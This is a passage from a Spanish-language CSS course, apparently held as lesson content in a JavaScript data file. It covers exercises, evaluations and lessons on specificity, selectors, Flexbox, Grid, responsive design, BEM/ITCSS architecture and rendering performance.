**Objetivo:** Dominar texto, colores, bordes y el modelo de caja bsico.



**HTML Base:**

\`\`\`html

<div class="perfil">

    <img src="https://via.placeholder.com/150" alt="Avatar">

    <h1>Tu Nombre</h1>

    <p>Desarrollador Web Junior apasionado por el diseo.</p>

    <a href="#">Contactar</a>

</div>

\`\`\`



**Tu Misin:**

1.  Centra todo el texto.

2.  Haz que la imagen sea redonda (\`border-radius: 50%\`).

3.  Ponle un borde gris fino a la tarjeta completa y un poco de sombra suave.

4.  Dale espacio interno (\`padding\`) para que el texto no toque los bordes.

5.  Convierte el enlace "Contactar" en un botn: fondo azul, texto blanco, sin subrayado, y con bordes redondeados.



---



## 2. Tarjetas de Producto (The Shop)

**Objetivo:** \`display: inline-block\`, \`margin\` y \`hover\`.



**HTML Base:**

\`\`\`html

<div class="producto">

    <h2>Zapatillas Runner</h2>

    <p>Precio: $99</p>

    <button>Comprar</button>

</div>

<div class="producto">

    <h2>Camiseta Sport</h2>

    <p>Precio: $25</p>

    <button>Comprar</button>

</div>

<!-- ...agrega uno mas -->

\`\`\`



**Tu Misin:**

1.  Haz que los productos se muestren uno al lado del otro (no uno debajo del otro). Tip: \`display: inline-block\` y un ancho fijo (ej: \`30%\`).

2.  Dale a cada producto un borde y un \`padding\`.

3.  **Reto:** Haz que cuando pases el mouse por encima de un producto (\`:hover\`), la sombra se haga ms intensa o el borde cambie de color.



---



## 3. Men de Navegacin "Classic"

**Objetivo:** Quitar estilos por defecto de listas y manejar \`display\`.



**HTML Base:**

\`\`\`html

<nav>

    <ul class="menu">

        <li><a href="#">Inicio</a></li>

        <li><a href="#">Servicios</a></li>

        <li><a href="#">Acerca de</a></li>

        <li><a href="#">Contacto</a></li>

    </ul>

</nav>

\`\`\`



**Tu Misin:**

1.  Quita los puntos de la lista (\`list-style: none\`).

2.  Quita el padding y margin por defecto del \`ul\`.

3.  Haz que los elementos \`li\` se pongan en una sola lnea horizontal.

4.  Estiliza los enlaces: quita el subrayado, ponles color blanco y fondo oscuro.

5.  Cambia el color de fondo cuando el usuario pase el mouse.



---



## 4. El Formulario Elegante

**Objetivo:** Estilizar inputs y botones con \`padding\` y bordes.



**HTML Base:**

\`\`\`html

<form class="login-form">

    <h2>Iniciar Sesin</h2>

    <input type="email" placeholder="Tu correo">

    <input type="password" placeholder="Tu contrasea">

    <button type="submit">Entrar</button>

</form>

\`\`\`



**Tu Misin:**

1.  Dale un ancho limitado al formulario (ej: \`300px\`) y cntralo en la pgina con \`margin: 0 auto\`.

2.  Haz que los \`input\` ocupen el 100% del ancho del formulario (\`display: block; width: 100%\`).

3.  Dales \`padding\` interno para que no se vean aplastados.

4.  Ponles un borde suave y redondeado.

5.  Haz que el botn destaque con un color vibrante.



---



## 5. Mini Landing Page "Hero"

**Objetivo:** Integracin final. \`vh\`, fondos y tipografa.



**HTML Base:**

\`\`\`html

<header class="hero">

    <h1>Bienvenido al Futuro</h1>

    <p>Creamos experiencias digitales increbles.</p>

    <a href="#" class="btn-cta">Ver ms</a>

</header>

<section class="contenido">

    <p>Aqu va el resto de la pgina...</p>

</section>

\`\`\`



**Tu Misin:**

1.  Haz que el \`.hero\` ocupe toda la altura de la pantalla (\`height: 100vh\`) o al menos \`400px\`.

2.  Ponle un color de fondo oscuro o un degradado (\`linear-gradient\`).

3.  Centra el contenido vertical y horizontalmente (Tip: puedes usar \`text-align: center\` y mucho \`padding-top\`, o investigar \`display: flex\` si te sientes valiente, aunque es nivel intermedio).

4.  Usa una fuente grande y llamativa para el ttulo.`,completed:!1},{id:"css-eval-junior",title:"Evaluacin Final: Nivel Junior",level:"junior",content:`# Evaluacin de Competencias: CSS Junior



Esta evaluacin mide tu comprensin de los fundamentos de CSS: selectores, modelo de caja y posicionamiento bsico.



## Seccin 1: Teora (Responde brevemente)



1.  **Explica la diferencia entre \`class\` e \`id\`. Cundo deberas usar cada uno?**

2.  **Dibuja o describe las partes del Box Model (Modelo de Caja) desde adentro hacia afuera.**

3.  **Qu propiedad CSS se usa para cambiar el color de fondo? Y el color del texto?**

4.  **Si tengo \`<p class="texto">Hola</p>\` y en CSS tengo \`p { color: red; }\` y \`.texto { color: blue; }\`, De qu color se ver el texto y por qu?**

5.  **Para qu sirve \`box-sizing: border-box\` y por qu es importante?**



## Seccin 2: Prctica - La Tarjeta de Perfil



Crea el HTML y CSS para una tarjeta de perfil que cumpla con lo siguiente:

1.  **Contenedor:** Ancho de 300px, centrado en la pgina, borde gris suave, sombra ligera (\`box-shadow\`), esquinas redondeadas.

2.  **Imagen:** Una imagen de avatar circular (\`border-radius: 50%\`) centrada horizontalmente.

3.  **Texto:** Nombre (h2) y descripcin (p) centrados.

4.  **Botn:** Un enlace (\`a\`) que parezca botn (fondo azul, texto blanco, padding) al final de la tarjeta.

5.  **Interaccin:** Al pasar el mouse sobre el botn, este debe cambiar de color de fondo (oscurecerse).



**Restricciones:**

*   No uses Flexbox ni Grid (usa \`text-align: center\`, \`margin: 0 auto\`, \`display: inline-block\`).

*   Usa un archivo CSS externo.



## Seccin 3: El Desafo del Centrado



Tienes un \`div\` de 200x200px.

**Reto:** Cntralo perfectamente horizontal en la pantalla usando \`margin\`.



## Criterios de Aprobacin



*   [ ] Cdigo ordenado y legible.

*   [ ] Uso correcto de selectores de clase (evitar IDs para estilos).

*   [ ] Comprensin clara del Box Model (los elementos no se rompen ni se salen).

*   [ ] No uso de estilos en lnea (\`style="..."\`).

*   [ ] La tarjeta se ve visualmente agradable (espaciados consistentes).

`,completed:!1,isProject:!0},{id:"css-ss-especificidad-cascada",title:"La Guerra de la Especificidad (The Specificity Wars)",level:"semi-senior",content:`# Leccin 12: La Guerra de la Especificidad (The Specificity Wars)



## 1. Por qu mi CSS no funciona?



Has escrito \`color: red;\` pero el texto sigue azul. Te ha pasado?

Bienvenido al mundo de la **Especificidad**. El navegador no "elige al azar"; sigue un sistema de puntuacin estricto para decidir qu regla gana.



## 2. El Sistema de Puntos (0, 0, 0, 0)



Imagina un marcador de 4 cifras. Quien tenga el nmero ms alto, gana.



1.  **Estilos en lnea (\`style="..."\`)**: Valen **1,0,0,0**. (La bomba nuclear).

2.  **IDs (\`#header\`)**: Valen **0,1,0,0**. (Tanques de guerra).

3.  **Clases, pseudoclases, atributos (\`.btn\`, \`:hover\`, \`[type="text"]\`)**: Valen **0,0,1,0**. (Soldados).

4.  **Elementos/Etiquetas (\`div\`, \`h1\`)**: Valen **0,0,0,1**. (Civiles).



*El selector universal \`*\` vale 0,0,0,0.*



### Ejemplos de Batalla:



**Pelea A:**

\`#menu li\`  (1 ID + 1 Etiqueta) = **0,1,0,1**

\`.menu-item\` (1 Clase) = **0,0,1,0**

**Ganador:** \`#menu li\` (Aunque \`.menu-item\` est escrito despus, ID mata clase).



**Pelea B:**

\`.tarjeta .titulo\` (2 Clases) = **0,0,2,0**

\`div.tarjeta h2\` (1 Clase + 2 Etiquetas) = **0,0,1,2**

**Ganador:** \`.tarjeta .titulo\` (20 es mayor que 12).



## 3. La Cascada (El desempate)



Si dos selectores tienen **exactamente la misma puntuacin**, entonces (y solo entonces) gana el que est escrito al final del archivo CSS.



## 4. \`!important\` - El botn de pnico



\`color: red !important;\`

Esto rompe la especificidad y se pone por encima de todo (incluso de los estilos en lnea).



**   Incorrecto:**

Usarlo porque "no s por qu no se aplica mi estilo y tengo prisa".



**   Correcto:**

Usarlo para sobreescribir estilos de libreras externas que no puedes controlar o clases de utilidad atmicas que DEBEN aplicarse siempre (ej: \`.d-none { display: none !important; }\`).



## 5. Caso Real: El infierno de los IDs

Si usas \`#sidebar\` para dar estilos, luego no podrs cambiar el color de un botn dentro del sidebar con una clase \`.btn-gris\`, porque \`#sidebar .btn\` (0,1,1,0) gana a \`.btn-gris\` (0,0,1,0).

Tendras que escribir \`#sidebar .btn-gris\` para empatar/ganar.

**Solucin Senior:** **NO USES IDs PARA ESTILOS.** Mantn la especificidad baja usando solo clases. As todo es ms fcil de sobreescribir.

`,completed:!1},{id:"css-ss-selectores-avanzados",title:"Selectores Avanzados (El Bistur)",level:"semi-senior",content:`# Leccin 13: Selectores Avanzados (El Bistur)



## 1. Combinadores: Relaciones de Familia



Ya conoces el espacio (descendiente): \`div p\` (cualquier p dentro de div). Ahora veamos precisin quirrgica.



*   **Hijo Directo (\`>\`)**:

    \`ul > li\`

    Solo selecciona los \`li\` que son hijos **inmediatos** de \`ul\`. No selecciona nietos.

    * til para mens anidados o evitar efectos secundarios.*



*   **Hermano Adyacente (\`+\`)**:

    \`h1 + p\`

    Selecciona el prrafo que est **inmediatamente despus** del h1.

    * til para dar margen extra al primer prrafo de un artculo.*



*   **Hermano General (\`~\`)**:

    \`h1 ~ p\`

    Selecciona **todos** los prrafos que sean hermanos del h1 y estn despus de l.



## 2. Selectores de Atributo



Puedes seleccionar elementos por sus atributos HTML.



*   \`input[type="text"]\` -> Solo inputs de texto.

*   \`a[href^="https"]\` -> Enlaces que **comienzan** con https (seguros).

*   \`a[href$=".pdf"]\` -> Enlaces que **terminan** en .pdf. (Ideal para ponerles un iconito de PDF al lado con \`::after\`!).



## 3. Pseudo-clases de Estado y Orden



*   **:hover, :active, :focus**: Ya las conoces de los enlaces. \`:focus\` es vital para accesibilidad (teclado).

*   **:first-child / :last-child**: El primero o ltimo hijo.

    \`li:last-child { border-bottom: none; }\`

*   **:nth-child(n)**: Magia matemtica.

    \`tr:nth-child(even)\` -> Selecciona filas pares (2, 4, 6...). Perfecto para tablas "cebra".

    \`li:nth-child(3)\` -> Selecciona solo el tercer elemento.

*   **:not(selector)**: La lgica negativa.

    \`button:not(.primario)\` -> Todos los botones que NO tengan la clase \`.primario\`.

    \`div:not(:last-child)\` -> Todos los divs menos el ltimo (genial para poner mrgenes entre elementos).



## 4. Pseudo-elementos (Lo que no existe en el HTML)



Crean "elementos falsos" con CSS. Requieren \`content: ''\`.



*   **::before / ::after**: Insertan contenido antes o despus del elemento.

    \`\`\`css

    .precio::before {

        content: '$';

        color: gray;

    }

    \`\`\`

    *Usos Pro:  conos, adornos visuales, tooltips, limpiar floats (clearfix).*



## 5. Ejercicio

Crea una lista de 5 elementos.

1.  Usa CSS para que el primero sea rojo (\`:first-child\`).

2.  Usa CSS para que el ltimo sea azul (\`:last-child\`).

3.  Usa CSS para que los impares tengan fondo gris (\`:nth-child(odd)\`).

4.  Todo esto sin aadir ni una sola clase al HTML. Solo fuerza bruta de selectores!

`,completed:!1},{id:"css-ss-flexbox",title:"Flexbox en Profundidad",level:"semi-senior",content:`# Leccin 14: Flexbox en Profundidad



## 1. El fin de los \`floats\`



Antes, maquetar era un dolor. Flexbox lleg para salvarnos. Es un sistema para alinear elementos en **una sola dimensin** (fila o columna).



## 2. El Contenedor (\`display: flex\`)



Al poner \`display: flex\` en un padre, sus hijos directos se convierten en "flex items" y se ponen en fila automticamente.



\`\`\`css

.contenedor {

    display: flex;

    /* Opcin: flex-direction: row (defecto) | column | row-reverse | column-reverse */

}

\`\`\`



## 3. Los dos ejes



Flexbox tiene dos ejes invisibles. Entender esto es la clave.

*   **Eje Principal (Main Axis):** Sigue la direccin del \`flex-direction\`. (Si es row, es horizontal).

*   **Eje Cruzado (Cross Axis):** Corta perpendicularmente al principal. (Si es row, es vertical).



## 4. Alineacin (La trinidad)



1.  **\`justify-content\`**: Mueve los hijos en el **Eje Principal**.

    *   \`flex-start\` (inicio), \`flex-end\` (final), \`center\` (centro).

    *   \`space-between\` (extremos pegados, espacio igual en medio).

    *   \`space-around\` (espacio alrededor de cada uno).



2.  **\`align-items\`**: Mueve los hijos en el **Eje Cruzado**.

    *   \`stretch\` (estirar, defecto), \`center\` (centrado vertical), \`flex-start\`, \`flex-end\`, \`baseline\`.



3.  **\`flex-wrap\`**: Qu pasa si no caben?

    *   \`nowrap\` (apretarlos, defecto).

    *   \`wrap\` (bajar a la siguiente lnea).



## 5. El Santo Grial: Centrado Perfecto

\`\`\`css

.padre {

    display: flex;

    justify-content: center; /* Horizontal */

    align-items: center;     /* Vertical */

    height: 100vh;

}

\`\`\`



## 6. Poderes de los Hijos (Flex Items)



*   **\`flex-grow\`**: Capacidad de crecer. \`flex-grow: 1\` hace que el elemento chupe todo el espacio vaco disponible.

*   **\`flex-shrink\`**: Capacidad de encogerse si falta espacio.

*   **\`flex-basis\`**: Tamao ideal inicial.

*   **\`flex: 1\`**: Shorthand comn (\`grow: 1, shrink: 1, basis: 0\`). Hace que todos midan lo mismo.



## 7. Caso Real: Header de Navegacin

Imagina un Logo a la izquierda, Men al centro y Usuario a la derecha.



\`\`\`html

<header class="flex-header">

    <div class="logo">Logo</div>

    <nav>...</nav>

    <div class="user">User</div>

</header>

\`\`\`



\`\`\`css

.flex-header {

    display: flex;

    justify-content: space-between; /* Clave */

    align-items: center; /* Para que el logo no se estire si el user es alto */

}

\`\`\`

`,completed:!1},{id:"css-ss-grid-layout",title:"Grid Layout (La Grilla Maestra)",level:"semi-senior",content:`# Leccin 15: Grid Layout (La Grilla Maestra)



## 1. Flexbox vs Grid



*   Flexbox es para **1 Dimensin** (Fila O Columna).

*   Grid es para **2 Dimensiones** (Filas Y Columnas a la vez).

*   Flexbox es "Content-First" (se adapta al contenido). Grid es "Layout-First" (el contenido se adapta a la grilla definida).



## 2. Definiendo la Grilla



\`\`\`css

.grilla {

    display: grid;

    /* 3 columnas: 200px, automtica, y 1 fraccin */

    grid-template-columns: 200px auto 1fr;

    /* 2 filas de altura fija */

    grid-template-rows: 100px 100px;

    /* Espacio entre celdas (Adis margin hacks!) */

    gap: 20px;

}

\`\`\`



### La unidad \`fr\` (fraccin)

Es mgica. \`fr\` reparte el espacio disponible.

\`grid-template-columns: 1fr 1fr 1fr;\` -> 3 columnas de ancho idntico y fluido.

\`grid-template-columns: 2fr 1fr;\` -> La primera es el doble de ancha que la segunda.



## 3. Repitiendo (\`repeat\`)



Para no escribir \`1fr 1fr 1fr 1fr...\`

\`grid-template-columns: repeat(4, 1fr);\`



Para responsive automtico (Magia Negra):

\`grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));\`

*Esto crea tantas columnas de 250px como quepan. Si sobra espacio, las estira.*



## 4. Posicionando elementos



Puedes decirle a un hijo dnde vivir.



\`\`\`css

.hijo-destacado {

    /* Empieza en la lnea de columna 1 y termina en la 3 (ocupa 2 columnas) */

    grid-column: 1 / 3;

    /* Empieza en fila 1 y termina en 3 */

    grid-row: 1 / 3;

}

\`\`\`

*O ms fcil: \`grid-column: span 2;\`*



## 5. Grid Areas (Diseo con ASCII Art)



Nombra tus reas:

\`\`\`css

.padre {

    display: grid;

    grid-template-areas:

        "header header header"

        "menu main main"

        "menu footer footer";

}



.header { grid-area: header; }

.menu { grid-area: menu; }

.main { grid-area: main; }

.footer { grid-area: footer; }

\`\`\`

Es literalmente dibujar tu web en el cdigo!



## 6. Ejercicio: Galera de Fotos (Bento Box)

Crea un contenedor grid. Haz que algunas fotos ocupen 1x1, otras 2x2 y otras 1x2 (altas). Usa \`grid-coulmn: span 2\` y \`grid-row: span 2\`. Con Flexbox esto sera una pesadilla matemtica de \`calc()\`. Con Grid son 3 lneas.

`,completed:!1},{id:"css-ss-responsive-design",title:"Responsive Design y Media Queries",level:"semi-senior",content:`# Leccin 16: Responsive Design y Media Queries



## 1. La Web no es papel



Tus usuarios usarn un iPhone SE, una tableta vieja, una laptop de 13" o un monitor ultrawide de 34". Si tu web solo se ve bien en tu pantalla, has fallado.



## 2. Meta Viewport (Requisito Indispensable)



Sin esto en tu HTML \`<head>\`, el mvil intentar mostrar la web como si fuera de escritorio (alejando el zoom).

\`\`\`html

<meta name="viewport" content="width=device-width, initial-scale=1.0">

\`\`\`

*Si usas VS Code y escribes \`!\` + Tab, esto ya viene incluido.*



## 3. Estrategia: Mobile First



Antiguamente disebamos para PC y luego "arreglbamos" para mvil.

**Hoy es al revs.**

Disea primero para el mvil (pantalla pequea -> CSS base). Luego, usa Media Queries para **aadir** complejidad en pantallas grandes.



**Por qu?**

*   El mvil obliga a priorizar el contenido esencial.

*   El cdigo base es ms ligero.

*   Es ms fcil escalar (agregar columnas) que des-escalar (forzar columnas a filas).



## 4. Media Queries (@media)



Son condiciones: "Si la pantalla mide al menos X, aplica esto".



\`\`\`css

/* 1. Estilos Base (Mobile) */

body {

    font-size: 16px;

    background: white;

}

.columna {

    width: 100%; /* Una debajo de otra */

}



/* 2. Tablet (aprox > 768px) */

@media (min-width: 768px) {

    .columna {

        width: 50%; /* Dos columnas */

    }

}



/* 3. Desktop (aprox > 1024px) */

@media (min-width: 1024px) {

    body {

        font-size: 18px; /* Letra ms grande en pantalla grande */

        max-width: 1200px;

        margin: 0 auto; /* Centrar web */

    }

    .columna {

        width: 33.3%; /* Tres columnas */

    }

}

\`\`\`



## 5. Breakpoints (Puntos de quiebre) comunes



No inventes nmeros mgicos (\`723px\`). Usa estndares:

*   **640px** (Mvil grande / Tablet pequea)

*   **768px** (Tablet vertical - iPad clsico)

*   **1024px** (Tablet horizontal / Laptop pequea)

*   **1280px** (Desktop estndar)



## 6. Imgenes Responsivas



Nunca dejes que una imagen rompa tu diseo.

Regla de oro semi-senior:

\`\`\`css

img {

    max-width: 100%;

    height: auto;

}

\`\`\`

Esto asegura que la imagen nunca sea ms ancha que su contenedor y que mantenga su proporcin.



## 7. Reto Responsivo

Toma tu ejercicio de "Tarjetas de Producto" (Leccin anterior).

1.  Haz que en mvil (\`< 600px\`) se vea 1 columna.

2.  En tablet (\`600px - 900px\`) se vean 2 columnas.

3.  En desktop (\`> 900px\`) se vean 3 columnas.

Todo usando Grid o Flexbox inside de las media queries.

`,completed:!1},{id:"css-ss-buenas-practicas-organizacion",title:"Buenas Prcticas Reales y Organizacin",level:"semi-senior",content:`# Leccin 17: Buenas Prcticas Reales y Organizacin



## 1. El caos de un archivo de 2000 lneas



Cuando trabajas en equipo o el proyecto crece, "tirar cdigo" en un solo archivo \`style.css\` es suicidio.



## 2. Metodologas de Naming (BEM)



**BEM** (Block, Element, Modifier) es un estndar para nombrar clases y evitar el infierno de especificidad.

Formato: \`.bloque__elemento--modificador\`.



*   **Bloque (.tarjeta):** El componente independiente.

*   **Elemento (.tarjeta__titulo):** Parte interna del bloque. Separado por \`__\`.

*   **Modificador (.tarjeta--destacada):** Una variacin del bloque. Separado por \`--\`.



**Ejemplo BEM:**

\`\`\`html

<article class="card card--featured">

    <h2 class="card__title">Ttulo</h2>

    <button class="card__btn card__btn--primary">Ver ms</button>

</article>

\`\`\`

*Ventaja:* Al leer el HTML sabes exactamente qu hace cada clase y su relacin. Adems, la especificidad es plana (0,0,1,0), fcil de cambiar.



## 3. Evita anidamiento profundo (Deep Nesting)



**Mal (SASS styling o selectores largos):**

\`\`\`css

.header .nav .menu ul li a span { color: red; }

\`\`\`

Esto es lento para el navegador y terrible para mantener. Si cambias el \`span\` por un \`i\`, se rompe.



**Bien:**

\`\`\`css

.nav-link-icon { color: red; }

\`\`\`

(Usando una clase directa). Mximo 3 niveles de anidacin.



## 4. Unidades relativas siempre

Usa \`rem\` para tamaos de fuente y mrgenes globales.

Usa \`em\` para paddings de botones (para que escalen con el botn).

Evita \`px\` para layout a menos que sea un borde de 1px.



## 5. Variables CSS (Custom Properties)



CSS nativo tiene variables!  salas para colores, fuentes y espaciados.



\`\`\`css

:root {

    --color-primary: #3498db;

    --spacing-md: 16px;

}



.btn {

    background-color: var(--color-primary);

    padding: var(--spacing-md);

}

\`\`\`

*Si el cliente quiere cambiar el azul por rojo, cambias 1 lnea, no 500.*



## 6. Organizacin de Archivos



Aunque al final se use un bundler (Vite/Webpack), mentalmente organiza tu CSS as:

1.  **Variables/Config:** Colores, fuentes.

2.  **Reset:** Normalizar navegadores.

3.  **Base:** Estilos para tags bsicos (\`h1\`, \`p\`, \`body\`).

4.  **Layout:** Estructura mayor (\`header\`, \`footer\`, \`grid\`).

5.  **Componentes:** \`.btn\`, \`.card\`, \`.modal\`.

6.  **Utilidades:** \`.text-center\`, \`.mt-5\` (mrgenes).



## 7. Bug comn: Sobreescritura silenciosa

Revisa siempre la consola. Si una propiedad est tachada, es que otra regla gan. Usa \`Ctrl+F\` en tu CSS para ver si repetiste el selector. Y sobre todo: No uses IDs para estilos!

`,completed:!1},{id:"css-ss-ejercicios-semisenior",title:"Ejercicios Prcticos: CSS Semi-Senior",level:"semi-senior",content:`# Ejercicios Prcticos: CSS Semi-Senior



Aplica BEM, Flexbox, Grid y Responsive Design.



---



## 1. El Navbar Responsivo Clsico

**Objetivo:** Flexbox y Media Queries.



**Requisito Desktop (>768px):**

*   Logo a la izquierda.

*   Links al derecho.

*   Todo alineado horizontalmente.



**Requisito Mvil (<768px):**

*   Logo centrado arriba.

*   Links debajo del logo, en columna (vertical), centrados.

*   Fondo de color distinto.



*Pista: Usa \`flex-direction: column\` en el media query mvil y \`row\` en desktop (o viceversa segn mobile-first).*



---



## 2. Galera de Arte (Grid Layout)

**Objetivo:** Grid implcito y explcito.



1.  Crea un contenedor con 6 imgenes.

2.  Usa CSS Grid para hacer un layout tipo "Mosaico".

3.  La primera imagen debe ser "destacada": ocupar 2 columnas de ancho y 2 filas de alto (\`grid-area\` o \`span\`).

4.  Usa \`gap\` para separar las fotos.

5.  Usa \`object-fit: cover\` en las imgenes para que no se deformen al estirarse.



---



## 3. Tarjeta de Pricing (Variables y BEM)

**Objetivo:** Variables CSS y Naming BEM.



Crea 3 tarjetas de precios: "Basic", "Pro" y "Enterprise".

1.  Define colores en \`:root\` (\`--color-basic\`, \`--color-pro\`, \`--color-ent\`).

2.  Usa clases BEM:

    *   \`.pricing-card\`

    *   \`.pricing-card__header\`

    *   \`.pricing-card__price\`

    *   \`.pricing-card--recommended\` (para la Pro, que debe ser un poco ms grande o tener sombra).

3.  Usa Flexbox para centrar el contenido de la tarjeta.



---



## 4. El Layout "Santo Grial"

**Objetivo:** Grid Areas.



Maqueta la estructura clsica de un sitio web:

*   Header (100% ancho).

*   Sidebar (Izquierda, 20% ancho).

*   Contenido Principal (Derecha, 80% ancho).

*   Footer (100% ancho).



**Reto:**

En mvil, el Sidebar debe moverse **debajo** del Contenido Principal (no antes).

Logra esto solo cambiando las \`grid-template-areas\` en el media query, sin tocar el HTML.



---



## 5. Debugging: Por qu no centra?

**Objetivo:** Solucin de problemas.

Crea un \`div\` con clase \`.padre\` y un \`div\` con clase \`.hijo\`.

Intenta centrar el hijo perfecta y verticalmente usando Flexbox.

Si el padre no tiene una altura definida (\`height\`), se centra verticalmente? Explora por qu el \`height: 100vh\` es necesario en el padre para ver el efecto.

`,completed:!1},{id:"css-eval-semisenior",title:"Evaluacin Final: Nivel Semi-Senior",level:"semi-senior",content:`# Evaluacin de Competencias: CSS Semi-Senior



Demuestra tu dominio del Layout Moderno (Flex/Grid), Diseo Responsivo y metodologas de organizacin.



## Seccin 1: Teora



1.  **Explica la especificidad CSS con tus propias palabras. Qu pesa ms, una clase o un ID?**

2.  **Menciona 3 diferencias clave entre Flexbox y CSS Grid.**

3.  **Qu es "Mobile First" y cmo afecta la forma en que escribes Media Queries?**

4.  **Para qu sirve la unidad \`rem\` y en qu se diferencia de \`px\` y \`em\`?**

5.  **Escribe un selector para el tercer elemento \`li\` de una lista.**



## Seccin 2: Layout Responsivo



Crea una estructura de pgina de "Galera de Fotos" que se comporte as:



*   **HTML:** Un contenedor con 6 elementos (fotos o cajas de colores).

*   **Mobile (< 600px):** 1 sola columna (una foto debajo de otra).

*   **Tablet (600px - 900px):** 2 columnas (Grid o Flex wrap).

*   **Desktop (> 900px):** 3 columnas.



**Requisito Adicional:**

Usa la metodologa **BEM** para nombrar tus clases (ej: \`.gallery__item\`).

Usa \`gap\` para los espaciados.



## Seccin 3: Debugging



Tienes el siguiente cdigo que NO funciona como esperas. El texto no se pone rojo. Explica por qu y arrglalo sin usar \`!important\`.



\`\`\`html

<div id="contenedor">

    <p class="texto">Hola Mundo</p>

</div>

\`\`\`



\`\`\`css

#contenedor p {

    color: blue;

}



.texto {

    color: red; /* Quiero que sea rojo */

}

\`\`\`



## Criterios de Aprobacin



*   [ ] Uso correcto de Grid y/o Flexbox para layout.

*   [ ] Implementacin correcta de Mobile First (Media queries \`min-width\`).

*   [ ] Naming correcto con BEM.

*   [ ] Solucin correcta al problema de especificidad demostrando entendimiento de pesos.

`,completed:!1,isProject:!0},{id:"css-senior-arquitecturas-css",title:"Arquitecturas CSS (BEM, ITCSS)",level:"senior",content:`# Leccin 19: Arquitecturas CSS (BEM, ITCSS)



## 1. El Problema de la Escala



En un proyecto pequeo, un solo archivo CSS funciona. En una aplicacin empresarial con 50 desarrolladores y 500 componentes, el CSS Global es el enemigo.

Escribir CSS Senior no es saberse todas las propiedades, es saber **organizarlo para que no se rompa** cuando alguien toque una lnea.



## 2. BEM (Block Element Modifier) - Estricto



Ya lo vimos en nivel SS, pero como Senior debes enforcinglo.

El verdadero valor de BEM es que **aplana la especificidad** y **aisla el contexto**.



**Pregunta de Entrevista:**

*"Por qu BEM prefiere \`.bloque__elemento\` en lugar de \`.bloque .elemento\`?"*

**Respuesta:** Porque \`.bloque .elemento\` aumenta la especificidad y depende de la estructura HTML. Si mueves \`.elemento\` fuera de \`.bloque\`, deja de funcionar. BEM hace que el estilo dependa de la clase, no de la ubicacin.



## 3. ITCSS (Inverted Triangle CSS)



Una arquitectura para organizar los imports. Ordena el CSS de "Genrico" a "Especfico".



1.  **Settings:** Variables, Configuracin (SASS/PostCSS).

2.  **Tools:** Mixins, Funciones.

3.  **Generic:** Reset, Normalize, \`box-sizing\`.

4.  **Elements:** Estilos base para etiquetas HTML (\`h1\`, \`a\`, \`p\` sin clases).

5.  **Objects:** Patrones de diseo sin cosmtica (Grid, Container, Media Object).

6.  **Components:** UI con esttica especfica (\`.btn\`, \`.card\`, \`.navbar\`).

7.  **Trumps (Utilities):** Helpers con \`!important\` que sobreescriben todo (\`.hidden\`, \`.text-center\`).



## 4. OOCSS (Object Oriented CSS)



Principio: **Separar estructura de piel.**



**Mal (Acoplado):**

\`\`\`css

.boton-login {

    width: 100px;

    background: blue;

    border-radius: 5px;

}

.boton-registro {

    width: 120px;

    background: red;

    border-radius: 5px;

}

\`\`\`



**Bien (OOCSS):**

\`\`\`css

/* Estructura (Objeto) */

.btn {

    border-radius: 5px;

    /* estructura base */

}



/* Piel (Skin) */

.btn-primary { background: blue; }

.btn-danger { background: red; }

.w-sm { width: 100px; }

\`\`\`

Esto reduce la deuda tcnica y el tamao del bundle final.



## 5. CSS Scoping



En apps modernas (React/Vue), usamos:

*   **CSS Modules:** Genera nombres nicos (\`_button_ax7z1\`) para emular encapsulamiento local.

*   **Shadow DOM:** Encapsulamiento nativo real (Web Components).

*   **CSS-in-JS:** (Styled Components) Elimina la colisin de nombres pero aade runtime overhead.



Como arquitecto, debes decidir cul usar basndote en: Performance vs Developer Experience.

`,completed:!1},{id:"css-senior-css-moderno",title:"CSS Moderno (Funciones y Lgica)",level:"senior",content:`# Leccin 20: CSS Moderno (Funciones y Lgica)



## 1. El mito de "CSS no es programacin"



El CSS moderno tiene variables, funciones matemticas, lgica condicional (@media, @supports) y ahora anidamiento nativo.



## 2. Custom Properties (Variables) Avanzadas



No solo guardan colores. Guardan **lgica parcial**.



\`\`\`css

.boton {

    --h: 200; /* Hue */

    --s: 50%; /* Saturation */

    --l: 40%; /* Lightness */

    background: hsl(var(--h), var(--s), var(--l));

}



.boton:hover {

    --l: 50%; /* Solo cambiamos la variable, no reescribimos el background */

}



.boton--rojo {

    --h: 0; /* Solo cambiamos el Hue */

}

\`\`\`



## 3. Matemticas Fluidas: \`clamp()\`, \`min()\`, \`max()\`



Olvida los media queries para tipografa. Usa **Fluid Typography**.



**\`clamp(MIN, VAL, MAX)\`**:

El valor ser \`VAL\`, pero nunca menos de \`MIN\` ni ms de \`MAX\`.



\`\`\`css

h1 {

    /* 

       Mnimo: 2rem (32px)

       Ideal: 5% del ancho de pantalla (responsive fluido)

       Mximo: 4rem (64px)

    */

    font-size: clamp(2rem, 5vw, 4rem);

}

\`\`\`

Esto elimina saltos bruscos entre breakpoints.



## 4. \`calc()\` para Layouts Hbridos



Mezclar unidades fijas y relativas.



\`\`\`css

/* Sidebar de 300px, el resto para el contenido, menos 20px de gap */

.content {

    width: calc(100% - 300px - 20px);

}

\`\`\`



## 5. Propiedades Lgicas (Logical Properties)



La web es internacional. \`margin-left\` tiene sentido en espaol (LTR), pero en rabe (RTL) rompe el diseo.

Usa propiedades lgicas que se adaptan a la direccin del texto.



*   \`margin-left\` -> **\`margin-inline-start\`**

*   \`margin-right\` -> **\`margin-inline-end\`**

*   \`margin-top\` -> **\`margin-block-start\`**

*   \`width\` -> **\`inline-size\`**

*   \`height\` -> **\`block-size\`**



Si cambias \`<html dir="rtl">\`, tu sitio se espeja automticamente gratis. Esto es nivel Senior.

`,completed:!1},{id:"css-senior-css-performance",title:"Performance de Renderizado (The Pixel Pipeline)",level:"senior",content:`# Leccin 21: Performance de Renderizado (The Pixel Pipeline)



## 1. Lo que pasa cuando cambias una clase



Entender el **Pixel Pipeline** distingue a un Senior de un Mid.

Pasos del navegador para pintar un frame (60fps = 16ms por frame):



1.  **JavaScript:** Cambia el DOM o estilos.

2.  **Style:** Recalcula qu reglas aplican a qu elementos.

3.  **Layout (Reflow):** Calcula geometra (ancho, alto, posicin). **COSTOSO!**

4.  **Paint:** Rellena pxeles (colores, bordes, sombras, texto). **COSTOSO.**

5.  **Composite:** Compone las capas (Layers) en la GPU. **BARATO.**



## 2. Layout Thrashing (El asesino del rendimiento)



Evita leer y escribir propiedades de geometra en un bucle.



**Mal:**

\`\`\`js

items.forEach(item => {

    let ancho = item.offsetWidth; // Lectura (fuerza Layout)

